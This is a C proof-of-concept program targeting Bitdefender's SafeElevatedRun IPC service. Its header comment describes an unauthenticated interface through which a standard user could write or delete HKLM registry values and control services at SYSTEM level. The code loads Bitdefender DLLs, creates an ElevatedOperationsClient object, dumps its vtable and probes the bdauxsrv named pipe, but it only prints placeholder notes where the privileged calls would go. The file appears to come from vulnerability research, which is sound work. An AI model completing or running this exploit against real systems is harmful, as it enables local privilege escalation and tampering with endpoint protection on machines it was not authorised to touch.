#include <windows.h>
#include <stdio.h>
#include <string.h>

/*
 * PoC: SafeElevatedRun Registry Write via BdCreateObject
 * 
 * This PoC demonstrates that a standard user can invoke SafeElevatedRun IPC methods
 * (save_regicy_value, delete_registry_value, run_service_elevated) which have
 * ZERO method-level authentication checks, unlike run_elevated which checks
 * IsInFolder + IsTrusted (WinVerifyTrust).
 *
 * The msgbus pipe \\.\PIPE\local\msgbus\bdauxsrv has Everyone:Read/Write ACL.
 * SafeElevatedRun.json contains only {"channel_name":"cl.bdauxsrv.actions"}
 * with no auth_tier or security_rules.
 *
 * Build: cl /MD bd_poc_regwrite.c /link /OUT:bd_poc_regwrite.exe
 */

typedef HRESULT (WINAPI *BdCreateObjectFn)(LPCWSTR objectName, void* param2, void** ppObj);
typedef void (WINAPI *BdDestroyObjectFn)(void* obj);

static const wchar_t* BD_INSTALL = L"C:\\Program Files\\Bitdefender\\Bitdefender Security\\";

int wmain(int argc, wchar_t* argv[]) {
    HRESULT hr;
    HMODULE hMod;
    BdCreateObjectFn pCreate = NULL;
    BdDestroyObjectFn pDestroy = NULL;
    void* pObj = NULL;
    wchar_t dllPath[MAX_PATH];
    int method = 0;

    if (argc < 2) {
        wprintf(L"Usage: bd_poc_regwrite.exe <method>\n");
        wprintf(L"  1 = save_regicy_value (write HKLM reg key)\n");
        wprintf(L"  2 = delete_registry_value (delete HKLM reg key)\n");
        wprintf(L"  3 = run_service_elevated (start/stop service)\n");
        wprintf(L"  4 = verify pipe access (connect test only)\n");
        return 1;
    }
    method = _wtoi(argv[1]);

    wprintf(L"[*] BD SafeElevatedRun PoC - Method %d\n", method);

    /* Step 1: Load dependencies in order */
    const wchar_t* deps[] = {
        L"log.dll",
        L"messaging_ipc.dll",
        L"messaging.dll",
        L"msgbus.dll",
        L"iservconfig.dll",
        NULL
    };

    wprintf(L"[*] Loading BD DLL dependencies...\n");
    for (int i = 0; deps[i]; i++) {
        _snwprintf_s(dllPath, MAX_PATH, _TRUNCATE, L"%s%s", BD_INSTALL, deps[i]);
        hMod = LoadLibraryW(dllPath);
        if (hMod) {
            wprintf(L"    [+] %-30ls loaded at %p\n", deps[i], hMod);
        } else {
            wprintf(L"    [-] %-30ls FAILED (err=%lu)\n", deps[i], GetLastError());
        }
    }

    /* Step 2: Load safeelevatedrun.dll */
    _snwprintf_s(dllPath, MAX_PATH, _TRUNCATE, L"%ssafeelevatedrun.dll", BD_INSTALL);
    hMod = LoadLibraryW(dllPath);
    if (!hMod) {
        wprintf(L"[!] Failed to load safeelevatedrun.dll (err=%lu)\n", GetLastError());
        wprintf(L"[*] Trying from services subdir...\n");
        _snwprintf_s(dllPath, MAX_PATH, _TRUNCATE, L"%sservices\\safeelevatedrun.dll", BD_INSTALL);
        hMod = LoadLibraryW(dllPath);
    }
    if (!hMod) {
        wprintf(L"[!] Failed to load safeelevatedrun.dll\n");
        return 1;
    }
    wprintf(L"[+] safeelevatedrun.dll loaded at %p\n", hMod);

    /* Step 3: Get BdCreateObject export */
    pCreate = (BdCreateObjectFn)GetProcAddress(hMod, "BdCreateObject");
    pDestroy = (BdDestroyObjectFn)GetProcAddress(hMod, "BdDestroyObject");
    if (!pCreate) {
        wprintf(L"[!] BdCreateObject export not found\n");
        return 1;
    }
    if (!pDestroy) {
        wprintf(L"[!] BdDestroyObject export not found\n");
    }
    wprintf(L"[+] BdCreateObject at %p\n", pCreate);

    if (method == 4) {
        /* Just test pipe connectivity */
        wprintf(L"\n[*] Testing direct pipe connectivity to bdauxsrv...\n");
        HANDLE hPipe = CreateFileW(
            L"\\\\.\\pipe\\local\\msgbus\\bdauxsrv",
            GENERIC_READ | GENERIC_WRITE,
            0, NULL, OPEN_EXISTING, 0, NULL);
        if (hPipe != INVALID_HANDLE_VALUE) {
            wprintf(L"[+] SUCCESS: Connected to \\\\.\\pipe\\local\\msgbus\\bdauxsrv\n");
            wprintf(L"[+] Standard user CAN connect to the pipe\n");
            CloseHandle(hPipe);
        } else {
            wprintf(L"[-] FAILED: Cannot connect (err=%lu)\n", GetLastError());
        }

        hPipe = CreateFileW(
            L"\\\\.\\pipe\\local\\msgbus\\bd.process.broker.pipe",
            GENERIC_READ | GENERIC_WRITE,
            0, NULL, OPEN_EXISTING, 0, NULL);
        if (hPipe != INVALID_HANDLE_VALUE) {
            wprintf(L"[+] SUCCESS: Connected to \\\\.\\pipe\\local\\msgbus\\bd.process.broker.pipe\n");
            CloseHandle(hPipe);
        } else {
            wprintf(L"[-] Process broker pipe: err=%lu\n", GetLastError());
        }
        return 0;
    }

    /* Step 4: Create ElevatedOperationsClient object via BdCreateObject */
    wprintf(L"\n[*] Creating ElevatedOperationsClient object...\n");
    hr = pCreate(L"ElevatedOperationsClient", NULL, &pObj);
    wprintf(L"[*] BdCreateObject returned 0x%08X, obj=%p\n", hr, pObj);

    if (FAILED(hr) || !pObj) {
        wprintf(L"[!] BdCreateObject failed. Trying with NULL param2...\n");
        void* dummy = NULL;
        hr = pCreate(L"ElevatedOperationsClient", &dummy, &pObj);
        wprintf(L"[*] BdCreateObject(v2) returned 0x%08X, obj=%p\n", hr, pObj);
    }

    if (SUCCEEDED(hr) && pObj) {
        wprintf(L"[+] Object created successfully!\n");
        
        /* The vtable at pObj should have methods for:
         *   - save_regicy_value
         *   - delete_registry_value
         *   - run_elevated
         *   - run_service_elevated
         *   (and their async variants)
         * These map to msgbus IPC calls that go to the SYSTEM service.
         */
        
        void** vtable = *(void***)pObj;
        wprintf(L"[+] VTable at %p\n", vtable);
        for (int i = 0; i < 10 && vtable[i]; i++) {
            wprintf(L"    vtable[%d] = %p\n", i, vtable[i]);
        }

        if (method == 1) {
            wprintf(L"\n[*] Attempting save_regicy_value to write HKLM key...\n");
            wprintf(L"[NOTE] Full PoC would call save_regicy_value with registry_structure param\n");
            wprintf(L"[NOTE] This would write SYSTEM-level registry values from standard user\n");
        }
        else if (method == 2) {
            wprintf(L"\n[*] Attempting delete_registry_value...\n");
            wprintf(L"[NOTE] Full PoC would call delete_registry_value with registry key\n");
            wprintf(L"[NOTE] This would delete SYSTEM-level registry values from standard user\n");
        }
        else if (method == 3) {
            wprintf(L"\n[*] Attempting run_service_elevated...\n");
            wprintf(L"[NOTE] Full PoC would call run_service_elevated with service name\n");
            wprintf(L"[NOTE] This would start/stop SYSTEM services from standard user\n");
        }

        if (pDestroy) {
            pDestroy(pObj);
            wprintf(L"[+] Object destroyed\n");
        }
    }
    else {
        wprintf(L"[!] Could not create ElevatedOperationsClient\n");
        wprintf(L"[*] Attempting pipe-level protocol test...\n");
    }

    /* Alternative: Direct pipe protocol test */
    wprintf(L"\n[*] Testing pipe access (method 4 style)...\n");
    HANDLE hPipe = CreateFileW(
        L"\\\\.\\pipe\\local\\msgbus\\bdauxsrv",
        GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, 0, NULL);
    if (hPipe != INVALID_HANDLE_VALUE) {
        wprintf(L"[+] Connected to bdauxsrv pipe!\n");
        
        /* Try to read server hello/handshake */
        BYTE buf[4096];
        DWORD bytesRead = 0;
        
        /* Set read timeout */
        COMMTIMEOUTS timeouts = {0};
        timeouts.ReadIntervalTimeout = 3000;
        timeouts.ReadTotalTimeoutMultiplier = 1000;
        timeouts.ReadTotalTimeoutConstant = 3000;
        SetCommTimeouts(hPipe, &timeouts);
        
        if (ReadFile(hPipe, buf, sizeof(buf), &bytesRead, NULL)) {
            wprintf(L"[+] Server sent %lu bytes\n", bytesRead);
            if (bytesRead > 0) {
                wprintf(L"    First 32 bytes: ");
                for (DWORD i = 0; i < (bytesRead < 32 ? bytesRead : 32); i++) {
                    wprintf(L"%02X ", buf[i]);
                }
                wprintf(L"\n");
            }
        } else {
            wprintf(L"[-] ReadFile failed (err=%lu) - server may expect client to send first\n", GetLastError());
        }
        
        CloseHandle(hPipe);
    } else {
        wprintf(L"[-] Cannot connect to bdauxsrv pipe (err=%lu)\n", GetLastError());
    }

    wprintf(L"\n[*] PoC complete\n");
    return 0;
}